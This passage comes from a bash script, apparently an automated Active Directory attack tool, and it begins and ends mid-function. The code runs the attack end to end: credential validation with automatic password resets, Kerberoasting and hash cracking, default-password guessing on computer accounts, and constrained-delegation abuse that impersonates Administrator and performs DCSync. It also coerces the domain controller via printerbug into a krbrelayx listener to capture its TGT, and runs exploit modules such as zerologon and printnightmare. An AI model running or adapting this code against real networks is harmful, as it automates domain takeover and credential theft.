            run "impacket-getTGT $(imp_principal) -hashes :$HASH -dc-ip $DC_IP"
            tgtout=$(impacket-getTGT "$(imp_principal)" -hashes ":$HASH" -dc-ip "$DC_IP" 2>&1)
        else
            run "impacket-getTGT $(imp_principal):*** -dc-ip $DC_IP"
            tgtout=$(impacket-getTGT "$(imp_principal):${PASS}" -dc-ip "$DC_IP" 2>&1)
        fi
        echo "$tgtout" | tee -a "$LOGFILE"
        if [[ -f "${USER}.ccache" ]]; then
            mv -f "${USER}.ccache" "$tgt" 2>/dev/null
            export KRB5CCNAME="$tgt"; KERB_TICKET="$tgt"; HAVE_AUTH=1
            ok "TGT obtained → ${C_BOLD}credentials are valid${C_RESET}"
            loot "Reusable Kerberos ticket → KRB5CCNAME=$tgt"
            note_cred_source "$USER" "authenticated (TGT obtained)"
        else
            # Classify WHY: expired password (recoverable!), disabled/locked,
            # nonexistent (deleted?), clock skew, or simply wrong password.
            _classify_auth_error "$tgtout" && return
            warn "Could not obtain TGT (bad creds, clock skew, or wrong domain)"
        fi
    fi

    # --- Step 2: confirm over SMB (reuses the cached ticket via --use-kcache) ---
    subsection "Validating ${USER} against the DC"
    local args; mapfile -t args < <(nxc_cred_args)
    run "$NXC smb $DCT ${args[*]}"
    local out; out=$($NXC smb "$DCT" "${args[@]}" 2>&1); echo "$out" | tee -a "$LOGFILE"

    if echo "$out" | grep -qi '\[+\].*(Guest)'; then
        # nxc tags a login that was DOWNGRADED to the Guest account with "(Guest)". When
        # guest is enabled, ANY username + blank password "succeeds" as Guest — this is
        # NOT a real credential for $USER (e.g. junk mined from text like safety.company).
        warn "'${USER}' only authenticated AS GUEST (blank-password downgrade, not a real credential) → skipping"
        note_cred_source "$USER" "guest-downgrade (not a real account)"
        return
    elif echo "$out" | grep -q '\[+\]'; then
        HAVE_AUTH=1
        ok "Valid credentials for ${C_BOLD}$USER${C_RESET}"
        if echo "$out" | grep -qiE '\(Pwn3d!\)|\(admin\)'; then
            IS_DC_ADMIN=1
            loot "★★★ ${USER} is LOCAL ADMIN on the DC — direct path to DCSync ★★★"
        fi
    elif echo "$out" | grep -qiE 'STATUS_PASSWORD_MUST_CHANGE|KEY_EXPIRED|PWD_EXPIRED'; then
        # The account authenticates but must change its password at next logon — this IS
        # the foothold (blank/known password flagged must-change). Reset it AUTOMATICALLY
        # (the current empty/known password is the old one); the new credential is then
        # re-queued and assessed via the normal path. No interactive prompt.
        loot "★ '${USER}' authenticates but MUST change its password at next logon → auto-resetting now"
        if _change_expired_password; then return; fi
        warn "Automatic password reset for '${USER}' failed (see log) — cannot use this account yet"; return
    elif [[ "$HAVE_AUTH" == "1" ]]; then
        warn "SMB check inconclusive, but the TGT proves the creds — proceeding authenticated"
    else
        # No Kerberos / NTLM fallback path that also failed
        if [[ -n "$HASH" || -n "$PASS" ]] && [[ "$KERBEROS" != "1" ]]; then
            err "Credentials NOT valid for $USER (continuing unauthenticated)"; return
        fi
        err "Could not authenticate $USER (continuing unauthenticated)"; return
    fi
}

# ===========================================================================
#  PHASE 5 — AUTHENTICATED ENUMERATION
# ===========================================================================
AUTH_ENUM_DONE=0
phase_auth_enum() {
    [[ "$HAVE_AUTH" != "1" ]] && return
    local args; mapfile -t args < <(nxc_cred_args)

    # ---- Domain-wide enumeration: users, groups, password policy, descriptions,
    # MAQ. Any authenticated identity sees the SAME thing here, so running it for
    # every pivoted credential is just noise — do it ONCE. Per-identity facts
    # (readable shares, LAPS/gMSA, ACLs, WinRM, …) still re-run in their phases.
    if [[ "$AUTH_ENUM_DONE" != "1" ]]; then
        AUTH_ENUM_DONE=1
        section "PHASE 5 · AUTHENTICATED ENUMERATION (domain-wide — runs once)"

        subsection "Password policy"
        run "$NXC smb $DCT ${args[*]} --pass-pol"
        $NXC smb "$DCT" "${args[@]}" --pass-pol 2>&1 | tee -a "$LOGFILE" | tee "$OUTDIR/pass_policy.txt"

        subsection "Domain users"
        run "$NXC smb $DCT ${args[*]} --users"
        $NXC smb "$DCT" "${args[@]}" --users 2>&1 | tee -a "$LOGFILE" | tee "$OUTDIR/domain_users.txt"
        # Extract clean usernames (rows whose date column is a date or <never>) and
        # merge into the master list so the summary + any user-driven logic see them.
        awk '$6 ~ /^[0-9]{4}-[0-9]{2}-[0-9]{2}$/ || $6=="<never>" {print $5}' "$OUTDIR/domain_users.txt" 2>/dev/null \
            | grep -vE '^$' | sort -u >"$OUTDIR/users_enum.txt"
        if [[ -s "$OUTDIR/users_enum.txt" ]]; then
            cat "$OUTDIR"/users_*.txt 2>/dev/null | sort -u >"$OUTDIR/users_all.txt"
            loot "$(wc -l <"$OUTDIR/users_enum.txt") domain users enumerated → users_all.txt"
        fi

        subsection "Domain groups"
        run "$NXC smb $DCT ${args[*]} --groups"
        $NXC smb "$DCT" "${args[@]}" --groups 2>&1 | tee -a "$LOGFILE" | tee "$OUTDIR/domain_groups.txt"

        if [[ "$CAP_LDAP" == "1" ]]; then
            subsection "User descriptions (often leak passwords)"
            run "$NXC ldap $DCT ${args[*]} -M get-desc-users"
            $NXC ldap "$DCT" "${args[@]}" -M get-desc-users 2>&1 | tee -a "$LOGFILE" | tee "$OUTDIR/user_descriptions.txt"
            if grep -qiE 'pass|pwd|cred|secret|token' "$OUTDIR/user_descriptions.txt" 2>/dev/null; then
                loot "Possible passwords in descriptions → harvesting and feeding the pivot engine"
                harvest_secrets "user_descriptions.txt" <"$OUTDIR/user_descriptions.txt"
            fi

            subsection "Quick privilege-escalation indicators (LDAP modules)"
            for mod in maq adcs; do
                run "$NXC ldap $DCT ${args[*]} -M $mod"
                $NXC ldap "$DCT" "${args[@]}" -M "$mod" 2>&1 | tee -a "$LOGFILE"
            done
            info "MachineAccountQuota > 0 → potential escalation via machine accounts (RBCD)"
        else
            subsection "LDAP not exposed → secondary enumeration via rpcclient"
            if [[ "$CAP_RPC" == "1" || "$CAP_SMB" == "1" ]]; then
                local pw="${PASS:-}"; [[ -n "$HASH" ]] && pw="$HASH"
                run "rpcclient -U '$DOMAIN/$USER%***' $DC_IP -c 'enumdomusers;querydispinfo'"
                rpcclient -U "${DOMAIN}/${USER}%${pw}" "$DC_IP" -c 'enumdomusers;querydispinfo' 2>&1 \
                    | tee -a "$LOGFILE" | tee "$OUTDIR/rpc_users_auth.txt"
            else
                warn "No LDAP/RPC/SMB for secondary enum — limited visibility"
            fi
        fi
    fi

    # ---- Per-identity: which shares THIS credential can actually read varies by
    # user, so this part runs every pivot. Saved per-user to keep each view.
    local uf; uf="$(_safe_name "$USER")"
    subsection "Readable shares as ${USER}"
    run "$NXC smb $DCT ${args[*]} --shares"
    $NXC smb "$DCT" "${args[@]}" --shares 2>&1 | tee -a "$LOGFILE" | tee "$OUTDIR/shares_auth_${uf}.txt" "$OUTDIR/shares_auth.txt"
}

# ===========================================================================
#  PHASE 6 — KERBEROASTING
# ===========================================================================
phase_kerberoast() {
    [[ "$HAVE_AUTH" != "1" ]] && return
    # Any authenticated user can request a TGS for every SPN, so the roastable set
    # is domain-wide — request it ONCE, not once per pivoted identity. (--abuse
    # WriteSPN handles roasting any account it newly SPN-enables on its own.)
    [[ "$KERB_DONE" == "1" ]] && return
    KERB_DONE=1
    section "PHASE 6 · KERBEROASTING (service accounts with SPNs)"
    [[ "$CAP_KERBEROS" != "1" ]] && { warn "Kerberos (88) not exposed → Kerberoasting not possible"; return; }
    have impacket-GetUserSPNs || { warn "impacket-GetUserSPNs unavailable, skipping"; return; }
    local outf="$OUTDIR/kerberoast_hashes.txt"

    subsection "Requesting TGS tickets for SPN-enabled accounts"
    if [[ -n "$KERB_TICKET" ]]; then
        run "KRB5CCNAME=$KERB_TICKET impacket-GetUserSPNs $(imp_principal) -k -no-pass -dc-host ${DC_FQDN:-$DC_IP} -request"
        KRB5CCNAME="$KERB_TICKET" impacket-GetUserSPNs "$(imp_principal)" -k -no-pass -dc-host "${DC_FQDN:-$DC_IP}" -request -outputfile "$outf" 2>&1 | tee -a "$LOGFILE"
    elif [[ -n "$HASH" ]]; then
        run "impacket-GetUserSPNs $(imp_principal) -hashes :$HASH -dc-ip $DC_IP -request"
        impacket-GetUserSPNs "$(imp_principal)" -hashes ":$HASH" -dc-ip "$DC_IP" -request -outputfile "$outf" 2>&1 | tee -a "$LOGFILE"
    else
        run "impacket-GetUserSPNs $(imp_principal):*** -dc-ip $DC_IP -request"
        impacket-GetUserSPNs "$(imp_principal):${PASS}" -dc-ip "$DC_IP" -request -outputfile "$outf" 2>&1 | tee -a "$LOGFILE"
    fi

    if [[ -s "$outf" ]]; then
        loot "Kerberoast hashes captured!"
        while read -r h; do echo -e "      ${C_MAGENTA}${h:0:80}…${C_RESET}"; done <"$outf"
        ok "Saved to kerberoast_hashes.txt (crack with: hashcat -m 13100)"
        [[ "$DO_CRACK" == "1" ]] && crack_hashes "$outf" 13100 "Kerberoast"
    else
        info "No Kerberoastable accounts found (no SPNs configured)"
    fi
}

# ===========================================================================
#  PRE-CREATED COMPUTER ACCOUNTS
# ===========================================================================
PRECREATED_DONE=0
phase_precreated_computers() {
    [[ "$HAVE_AUTH" != "1" ]] && return
    [[ "$PRECREATED_DONE" == "1" ]] && return
    [[ "$STEALTH" == "1" ]] && { info "Stealth mode: skipping pre-created computer account password checks"; return; }
    [[ "$CAP_LDAP" != "1" || -z "$DOMAIN" ]] && return
    have ldapsearch || return
    have impacket-getTGT || { warn "impacket-getTGT unavailable → cannot validate pre-created computer passwords"; return; }
    PRECREATED_DONE=1

    section "PRE-CREATED COMPUTER ACCOUNTS · default-password pivot"
    local args; mapfile -t args < <(nxc_cred_args)
    if nxc_has_module ldap pre2k; then
        subsection "NetExec pre2k module"
        local pre="$OUTDIR/precreated_computers_nxc.txt"
        run "$NXC ldap $DCT ${args[*]} -M pre2k"
        $NXC ldap "$DCT" "${args[@]}" -M pre2k 2>&1 | tee -a "$LOGFILE" | tee "$pre"
        if grep -qiE 'TGT|ccache|password|sAMAccountName|pre-created|pre2k' "$pre"; then
            loot "Pre-created computer account results → precreated_computers_nxc.txt"
            grep -oiP '(?:Account|User|sAMAccountName)\s*[:=]\s*\K\S+\$?' "$pre" 2>/dev/null | sort -u |
            while IFS= read -r acc; do
                [[ -z "$acc" || "$acc" != *\$ ]] && continue
                note_cred_source "$acc" "NetExec pre2k module"
            done
        fi
        return
    fi

    local base="dc=${DOMAIN//./,dc=}" raw="$OUTDIR/precreated_computers_ldap.txt" cand="$OUTDIR/precreated_computers.txt"
    : >"$raw"; : >"$cand"

    if [[ -n "$KERB_TICKET" ]]; then
        run "ldapsearch -Y GSSAPI computers with pwdLastSet/lastLogonTimestamp"
        KRB5CCNAME="$KERB_TICKET" ldapsearch -LLL -Y GSSAPI -H "ldap://${DC_FQDN:-$DC_IP}" -b "$base" \
            '(&(objectCategory=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' \
            sAMAccountName pwdLastSet lastLogonTimestamp userAccountControl 2>/dev/null >"$raw"
    elif [[ -n "$PASS" ]]; then
        run "ldapsearch simple bind as $USER for computer account candidates"
        ldapsearch -LLL -x -H "ldap://$DC_IP" -D "${USER}@${DOMAIN}" -w "$PASS" -b "$base" \
            '(&(objectCategory=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' \
            sAMAccountName pwdLastSet lastLogonTimestamp userAccountControl 2>/dev/null >"$raw"
    else
        info "Current credential is hash-only and no Kerberos LDAP bind is available → skipping"
        rm -f "$raw" "$cand"
        return
    fi

    awk '
        BEGIN { RS=""; FS="\n" }
        /sAMAccountName:/ {
            sam=""; pwd=""; last=""; uac="";
            for (i=1; i<=NF; i++) {
                if ($i ~ /^sAMAccountName:/)      { sam=$i;  sub(/^sAMAccountName:[[:space:]]*/, "", sam) }
                if ($i ~ /^pwdLastSet:/)          { pwd=$i;  sub(/^pwdLastSet:[[:space:]]*/, "", pwd) }
                if ($i ~ /^lastLogonTimestamp:/)  { last=$i; sub(/^lastLogonTimestamp:[[:space:]]*/, "", last) }
                if ($i ~ /^userAccountControl:/)  { uac=$i;  sub(/^userAccountControl:[[:space:]]*/, "", uac) }
            }
            if (sam != "" && (pwd == "0" || last == "" || last == "0"))
                print sam "\t" pwd "\t" last "\t" uac
        }
    ' "$raw" | sort -u >"$cand"

    if [[ ! -s "$cand" ]]; then
        info "No clear pre-created computer candidates found"
        return
    fi

    loot "$(wc -l <"$cand") computer account candidate(s) with unset password age/logon signals"
    local sam stem pw got=0 tried=0 max=40
    while IFS=$'\t' read -r sam _; do
        [[ -z "$sam" || "$sam" != *\$ ]] && continue
        (( tried++ ))
        (( tried > max )) && { warn "Candidate cap reached ($max) to avoid excessive auth attempts"; break; }
        stem="${sam%$}"
        for pw in "$stem" "${stem,,}" "${stem^^}"; do
            [[ -z "$pw" ]] && continue
            run "impacket-getTGT ${DOMAIN}/${sam}:<candidate> -dc-ip $DC_IP"
            rm -f "${sam}.ccache"
            if impacket-getTGT "${DOMAIN}/${sam}:${pw}" -dc-ip "$DC_IP" 2>&1 | tee -a "$LOGFILE" | grep -qiE 'Saving ticket|saved in'; then
                rm -f "${sam}.ccache"
                loot "★ Pre-created computer takeover: ${C_BOLD}${sam}${C_RESET} password is ${C_GREEN}${pw}${C_RESET}"
                add_secret "$pw" "pre-created computer account ($sam)"
                note_cred_source "$sam" "pre-created computer default password"
                queue_cred "$sam" "$pw" "" "Pre-created computer account"
                got=1
                break
            fi
            rm -f "${sam}.ccache"
        done
    done <"$cand"

    [[ "$got" == "0" ]] && info "No pre-created computer default passwords validated"
}

# ===========================================================================
#  AD ATTACK SURFACE  (IATT/PATT modules that decide what to attack next)
# ===========================================================================
SURFACE_DONE=0
phase_attack_surface() {
    [[ "$HAVE_AUTH" != "1" ]] && return
    [[ "$SURFACE_DONE" == "1" ]] && return
    SURFACE_DONE=1
    section "AD ATTACK SURFACE · delegation, deployment, DNS, RODC, dMSA"

    local sf="$OUTDIR/ad_attack_surface.txt"; : >"$sf"
    local args; mapfile -t args < <(nxc_cred_args)

    if have impacket-findDelegation && [[ -n "$DOMAIN" ]]; then
        subsection "Kerberos delegation (unconstrained / constrained / RBCD)"
        if [[ -n "$KERB_TICKET" ]]; then
            run "impacket-findDelegation $(imp_principal) -k -no-pass -dc-ip $DC_IP"
            KRB5CCNAME="$KERB_TICKET" impacket-findDelegation "$(imp_principal)" -k -no-pass -dc-ip "$DC_IP" 2>&1 \
                | tee -a "$LOGFILE" | tee -a "$sf"
        elif [[ -n "$HASH" ]]; then
            run "impacket-findDelegation $(imp_principal) -hashes :$HASH -dc-ip $DC_IP"
            impacket-findDelegation "$(imp_principal)" -hashes ":$HASH" -dc-ip "$DC_IP" 2>&1 \
                | tee -a "$LOGFILE" | tee -a "$sf"
        elif [[ -n "$PASS" ]]; then
            run "impacket-findDelegation $(imp_principal):*** -dc-ip $DC_IP"
            impacket-findDelegation "$(imp_principal):${PASS}" -dc-ip "$DC_IP" 2>&1 \
                | tee -a "$LOGFILE" | tee -a "$sf"
        fi
        grep -qiE 'Unconstrained|Constrained|AllowedToDelegate|Protocol Transition|RBCD|msDS-AllowedToAct' "$sf" 2>/dev/null \
            && loot "Delegation paths found → ad_attack_surface.txt (BloodHound/ACL phases will weaponize matching edges)"
    fi

    [[ "$CAP_LDAP" != "1" || -z "$DOMAIN" ]] && return
    local base="dc=${DOMAIN//./,dc=}" ldapout="$OUTDIR/ad_attack_surface_ldap.txt"; : >"$ldapout"
    _ldap_q() {
        local filter="$1"; shift
        if [[ -n "$KERB_TICKET" ]]; then
            KRB5CCNAME="$KERB_TICKET" ldapsearch -LLL -Y GSSAPI -H "ldap://${DC_FQDN:-$DC_IP}" -b "$base" "$filter" "$@" 2>/dev/null
        elif [[ -n "$PASS" ]]; then
            ldapsearch -LLL -x -H "ldap://$DC_IP" -D "${USER}@${DOMAIN}" -w "$PASS" -b "$base" "$filter" "$@" 2>/dev/null
        fi
    }

    subsection "Deployment attack surface (SCCM / MDT / WSUS / SCOM / ADFS)"
    {
        echo "## SCCM / System Management"
        _ldap_q '(|(objectClass=mSSMSManagementPoint)(objectClass=mSSMSSite)(cn=System Management)(servicePrincipalName=*MSServerClusterMgmtAPI*)(servicePrincipalName=*SMS*))' \
            cn dNSHostName mSSMSMPName mSSMSSiteCode servicePrincipalName distinguishedName
        echo
        echo "## WSUS / MDT / SCOM / ADFS indicators"
        _ldap_q '(|(servicePrincipalName=*WSUS*)(servicePrincipalName=*SCOM*)(servicePrincipalName=*ADFS*)(servicePrincipalName=*MSSQL*)(cn=*WSUS*)(cn=*MDT*)(cn=*SCOM*)(cn=*ADFS*))' \
            cn dNSHostName servicePrincipalName distinguishedName
    } | tee -a "$LOGFILE" >"$ldapout"
    grep -qiE 'mSSMS|System Management|WSUS|MDT|SCOM|ADFS|MSSQL' "$ldapout" 2>/dev/null \
        && loot "Deployment/management surface found → ad_attack_surface_ldap.txt"

    subsection "RODC / DSRM / privileged group indicators"
    {
        echo "## RODC"
        _ldap_q '(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=67108864))' \
            cn dNSHostName msDS-RevealedUsers msDS-NeverRevealGroup msDS-RevealOnDemandGroup
        echo
        echo "## DnsAdmins / DNS zones"
        _ldap_q '(|(cn=DnsAdmins)(objectClass=dnsZone)(objectClass=dnsNode))' \
            cn member distinguishedName dnsRecord
        echo
        echo "## dMSA / gMSA accounts"
        _ldap_q '(|(objectClass=msDS-GroupManagedServiceAccount)(objectClass=msDS-DelegatedManagedServiceAccount))' \
            sAMAccountName servicePrincipalName msDS-GroupMSAMembership msDS-ManagedAccountPrecededByLink distinguishedName
    } | tee -a "$LOGFILE" >>"$ldapout"
    grep -qiE 'msDS-DelegatedManagedServiceAccount|msDS-ManagedAccountPrecededByLink|DnsAdmins|dnsZone|msDS-RevealedUsers' "$ldapout" 2>/dev/null \
        && loot "RODC/DNS/dMSA indicators found → ad_attack_surface_ldap.txt"
}

# Abuse constrained delegation when the current identity can S4U to a DC service.
# This is non-destructive: it only requests a service ticket and immediately tries
# DCSync with that ticket if the delegated SPN is useful (cifs/ldap/host on the DC).
phase_delegation_abuse() {
    [[ "$HAVE_AUTH" != "1" ]] && return
    [[ "$DO_ABUSE" != "1" ]] && return
    have impacket-getST || return
    [[ -z "$DOMAIN" || ! -s "$OUTDIR/ad_attack_surface.txt" ]] && return

    local user_lc="${USER,,}" dc_lc="${DC_FQDN,,}" spn=""
    spn=$(awk -v u="$user_lc" -v dc="$dc_lc" '
        BEGIN { IGNORECASE=1 }
        index(tolower($0), u) && /(cifs|ldap|host)\// {
            for (i=1; i<=NF; i++) {
                if (tolower($i) ~ /^(cifs|ldap|host)\// && (dc == "" || index(tolower($i), dc) || index(tolower($i), "dc"))) {
                    gsub(/[,;]/, "", $i); print $i; exit
                }
            }
        }
    ' "$OUTDIR/ad_attack_surface.txt")
    [[ -z "$spn" ]] && return

    section "CONSTRAINED DELEGATION ABUSE · S4U to Administrator"
    loot "Current identity appears delegated to ${C_BOLD}$spn${C_RESET} → requesting Administrator service ticket"
    local args=()
    if [[ -n "$HASH" ]]; then args=(-hashes ":$HASH")
    elif [[ -n "$PASS" ]]; then args=()
    else info "No reusable password/hash for getST; skipping delegation abuse"; return; fi

    local before after cc
    before=$(find "$OUTDIR" -maxdepth 1 -name '*.ccache' -printf '%f\n' 2>/dev/null | sort)
    if [[ -n "$HASH" ]]; then
        run "impacket-getST -spn $spn -impersonate Administrator $(imp_principal) -hashes :$HASH -dc-ip $DC_IP"
        ( cd "$OUTDIR" && impacket-getST -spn "$spn" -impersonate Administrator "$(imp_principal)" "${args[@]}" -dc-ip "$DC_IP" 2>&1 ) | tee -a "$LOGFILE"
    else
        run "impacket-getST -spn $spn -impersonate Administrator $(imp_principal):*** -dc-ip $DC_IP"
        ( cd "$OUTDIR" && impacket-getST -spn "$spn" -impersonate Administrator "$(imp_principal):${PASS}" -dc-ip "$DC_IP" 2>&1 ) | tee -a "$LOGFILE"
    fi
    after=$(find "$OUTDIR" -maxdepth 1 -name '*.ccache' -printf '%f\n' 2>/dev/null | sort)
    cc=$(comm -13 <(printf '%s\n' "$before") <(printf '%s\n' "$after") | head -1)
    [[ -z "$cc" ]] && cc=$(find "$OUTDIR" -maxdepth 1 -iname '*Administrator*.ccache' -printf '%f\n' 2>/dev/null | head -1)
    [[ -z "$cc" ]] && { warn "S4U ticket was not produced"; return; }

    loot "★ Constrained delegation → Administrator ticket: ${C_BOLD}$cc${C_RESET}"
    note_cred_source "Administrator@$spn" "constrained delegation S4U by $USER"
    local old_ticket="$KERB_TICKET" old_user="$USER" old_pass="$PASS" old_hash="$HASH" old_auth="$HAVE_AUTH" old_admin="$IS_DC_ADMIN"
    KERB_TICKET="$OUTDIR/$cc"; USER="Administrator"; PASS=""; HASH=""; HAVE_AUTH=1; IS_DC_ADMIN=1
    export KRB5CCNAME="$KERB_TICKET"
    phase_dcsync
    USER="$old_user"; PASS="$old_pass"; HASH="$old_hash"; HAVE_AUTH="$old_auth"; IS_DC_ADMIN="$old_admin"; KERB_TICKET="$old_ticket"
    [[ -n "$KERB_TICKET" ]] && export KRB5CCNAME="$KERB_TICKET" || unset KRB5CCNAME
}

# ===========================================================================
#  UNCONSTRAINED DELEGATION  —  coerce the DC and capture its TGT (krbrelayx).
#  PRECONDITION-GATED: only ABUSABLE if WE control an account that has
#  unconstrained delegation. DCs are always unconstrained but you can't abuse one
#  you don't already own, so the DC is excluded. If we don't control any such
#  account it reports "not abusable by us" and stops. The capture itself needs a
#  listener (port 88) + DNS pointing at us, so — like the NTLM relay — the full
#  auto-capture runs only under AUTO_RELAY=1; otherwise a dynamic-IP playbook is
#  printed. Listener IP is auto-derived (attacker_ip), never asked for.
# ===========================================================================
UNCONSTR_DONE=0
phase_unconstrained_abuse() {
    [[ "$DO_ABUSE" != "1" ]] && return
    [[ "$IS_DC_ADMIN" == "1" || "$UNCONSTR_DONE" == "1" ]] && return
    [[ -z "$DOMAIN" ]] && return
    have impacket-findDelegation || return
    UNCONSTR_DONE=1

    local sf="$OUTDIR/unconstrained_delegation.txt"
    if   [[ -n "$KERB_TICKET" ]]; then
        KRB5CCNAME="$KERB_TICKET" impacket-findDelegation "$(imp_principal)" -k -no-pass -dc-ip "$DC_IP" 2>&1 | tee "$sf" >>"$LOGFILE"
    elif [[ -n "$HASH" ]]; then
        impacket-findDelegation "$(imp_principal)" -hashes ":$HASH" -dc-ip "$DC_IP" 2>&1 | tee "$sf" >>"$LOGFILE"
    elif [[ -n "$PASS" ]]; then
        impacket-findDelegation "$(imp_principal):${PASS}" -dc-ip "$DC_IP" 2>&1 | tee "$sf" >>"$LOGFILE"
    else return; fi

    # Unconstrained principals, EXCLUDING the DC (can't abuse one we don't own).
    local -a unc=(); local name bare
    while read -r name; do
        [[ -z "$name" ]] && continue
        bare="${name%\$}"
        [[ "${bare,,}" == "${DC_HOST,,}" ]] && continue
        unc+=("$name")
    done < <(awk 'tolower($0) ~ /unconstrained/ {print $1}' "$sf" 2>/dev/null | sort -u)
    [[ ${#unc[@]} -eq 0 ]] && { info "No abusable unconstrained-delegation principal (only the DC, which we don't control)"; return; }

    section "UNCONSTRAINED DELEGATION · coerce DC → capture its TGT"
    local p controlled="" ckey=""
    for p in "${unc[@]}"; do
        bare="${p%\$}"
        loot "Unconstrained delegation on: ${C_BOLD}$p${C_RESET}"
        # Abusable by us ONLY if we control that account (acting as it / owned / we hold its hash).
        if [[ "${bare,,}" == "${USER,,}" ]]; then controlled="$p"; ckey="${HASH##*:}"
        elif grep -qiE "^${bare}[[:space:]]" "$OUTDIR/owned_principals.txt" 2>/dev/null; then controlled="$p"
        elif grep -qiE "^${bare}\\\$?:" "$OUTDIR/secretsdump.txt" 2>/dev/null; then
            controlled="$p"; ckey=$(grep -iE "^${bare}\\\$?:" "$OUTDIR/secretsdump.txt" | head -1 | cut -d: -f4)
        fi
    done

    if [[ -z "$controlled" ]]; then
        info "None of those accounts are under our control yet → NOT abusable by us right now."
        info "(Becomes abusable once we own one of: ${unc[*]} — then it auto-fires.)"
        return
    fi

    local ip; ip="$(attacker_ip)"
    local kx ax dx pb host="adpwn.${DOMAIN}"
    kx="$(external_tool krbrelayx/krbrelayx.py)"; ax="$(external_tool krbrelayx/addspn.py)"
    dx="$(external_tool krbrelayx/dnstool.py)";  pb="$(external_tool krbrelayx/printerbug.py)"
    loot "★ We control '${controlled}' (unconstrained) → coerce the DC and grab its TGT (listener IP ${ip:-?})"

    # Full auto-capture binds port 88 + needs DNS pointing at us → opt-in (AUTO_RELAY=1),
    # same convention as the NTLM relay path. Otherwise: dynamic-IP playbook.
    if [[ "${AUTO_RELAY:-0}" == "1" && -n "$ip" && -n "$kx" && -n "$ckey" ]]; then
        subsection "AUTO unconstrained capture · krbrelayx + DNS + coerce"
        warn "Binding krbrelayx on :88 and adding DNS '${host}'→${ip}; time-boxed."
        [[ -n "$dx" ]] && python3 "$dx" -u "${DOMAIN}\\${USER}" $( [[ -n "$PASS" ]] && echo -p "$PASS" || echo -hashes ":${HASH##*:}" ) \
            -r "$host" -d "$ip" --action add "$DC_IP" 2>&1 | tee -a "$LOGFILE"
        rb_record "ADIDNS record $host added for unconstrained capture" \
                  "python3 $dx -u '${DOMAIN}\\${USER}' -r '$host' --action remove $DC_IP"
        ( cd "$OUTDIR" && timeout -k 10 "${AUTO_RELAY_TIMEOUT:-90}" python3 "$kx" -hashes ":$ckey" 2>&1 | tee -a "$LOGFILE" | tee unconstrained_krbrelayx.log ) &
        local kpid=$!; sleep 4
        [[ -n "$pb" ]] && python3 "$pb" "${DOMAIN}/${USER}:${PASS}@${DC_IP}" "$host" 2>&1 | tee -a "$LOGFILE"
        wait "$kpid" 2>/dev/null || true
        local cc; cc=$(find "$OUTDIR" -maxdepth 1 -iname "${DC_HOST}*\$.ccache" -o -iname "${DC_HOST}*.ccache" 2>/dev/null | head -1)
        if [[ -n "$cc" ]]; then
            loot "★★★ Captured the DC TGT → $(basename "$cc") → DCSync"
            KRB5CCNAME="$cc" impacket-secretsdump -k -no-pass "${DC_FQDN:-$DC_IP}" -just-dc 2>&1 | tee -a "$LOGFILE" | tee "$OUTDIR/unconstrained_dcsync.txt"
            grep -qE ':::' "$OUTDIR/unconstrained_dcsync.txt" && { ingest_dcsync_output "$OUTDIR/unconstrained_dcsync.txt" "Unconstrained delegation TGT capture"; IS_DC_ADMIN=1; }
        else
            warn "No DC TGT captured in the window — see unconstrained_krbrelayx.log"
        fi
        return
    fi

    subsection "Unconstrained-delegation playbook (listener-based; run with your shell)"
    detail "  # listener IP auto-derived: ${ip:-<your-ip>}   ·   controlled acct: ${controlled}"
    detail "  # 1) DNS A record pointing at you (you have DNS write on this domain):"
    detail "  python3 ${dx:-dnstool.py} -u '${DOMAIN}\\\\${USER}' -p '<pass>' -r ${host} -d ${ip:-<ip>} --action add ${DC_IP}"
    detail "  # 2) Listen with the controlled account's key (krbrelayx decrypts the coerced ticket → DC TGT):"
    detail "  python3 ${kx:-krbrelayx.py} -hashes :<NThash of ${controlled}>"
    detail "  # 3) Coerce the DC to authenticate to ${host} (=${ip:-<ip>}):"
    detail "  python3 ${pb:-printerbug.py} ${DOMAIN}/${USER}:'<pass>'@${DC_IP} ${host}"
    detail "  # → krbrelayx writes ${DC_HOST}\$.ccache → KRB5CCNAME=${DC_HOST}\$.ccache impacket-secretsdump -k -no-pass ${DC_FQDN:-$DC_IP} -just-dc"
    info "Set AUTO_RELAY=1 to let ADAutoPwn run this capture automatically (binds :88)."
}

# ===========================================================================
#  CVE CHECKS  (safe checks first; exploit only when already implemented safely)
# ===========================================================================
CVE_DONE=0
phase_cve_checks() {
    local mode="unauth"; [[ "$HAVE_AUTH" == "1" ]] && mode="auth"
    [[ "$CVE_DONE" == "auth" ]] && return
    [[ "$mode" == "unauth" && "$CVE_DONE" == "unauth" ]] && return
    [[ "$STEALTH" == "1" ]] && { info "Stealth mode: skipping CVE module checks"; return; }
    CVE_DONE="$mode"
    section "CVE CHECKS · AD-specific known-vuln modules ($mode)"

    local args=()
    if [[ "$HAVE_AUTH" == "1" ]]; then mapfile -t args < <(nxc_cred_args)
    else args=(-u '' -p ''); fi

    local out="$OUTDIR/cve_checks_${mode}.txt"; : >"$out"
    # Keep the default CVE pass fast. Spooler/coerce_plus give actionable relay
    # signal cheaply; printnightmare is comparatively slow/noisy and is only run
    # when explicitly requested with --deep-cve.
    # Zerologon is OFF by default: on a patched/modern DC it's never vulnerable and
    # the nxc check is slow/noisy for nothing. Only run it under --deep-cve.
    local modules=(spooler coerce_plus)
    [[ "$DEEP_CVE" == "1" ]] && modules=(zerologon printnightmare spooler coerce_plus)
    local m
    for m in "${modules[@]}"; do
        if ! nxc_has_module smb "$m"; then
            info "NetExec SMB module '$m' not available → skipping"
            continue
        fi
        subsection "NetExec module: $m"
        run "$NXC smb $DCT ${args[*]} -M $m"
        $NXC smb "$DCT" "${args[@]}" -M "$m" 2>&1 | tee -a "$LOGFILE" | tee -a "$out"
    done

    if [[ "$DEEP_CVE" != "1" && "$STEALTH" != "1" ]]; then
        if grep -qiE 'spooler.*(enabled|running)|print spooler.*(enabled|running)|coerce.*(vulnerable|success)|VULNERABLE' "$out" 2>/dev/null \
           && nxc_has_module smb printnightmare; then
            subsection "NetExec module: printnightmare (triggered by spooler/coercion signal)"
            run "$NXC smb $DCT ${args[*]} -M printnightmare"
            $NXC smb "$DCT" "${args[@]}" -M printnightmare 2>&1 | tee -a "$LOGFILE" | tee -a "$out"
        else
            info "Skipping slow PrintNightmare module in fast mode (no spooler/coercion signal; use --deep-cve to force it)"
        fi
    fi

    if grep -qiE 'VULNERABLE|is vulnerable|Success|CVE-|Zerologon|PrintNightmare|Spooler service enabled' "$out" 2>/dev/null; then
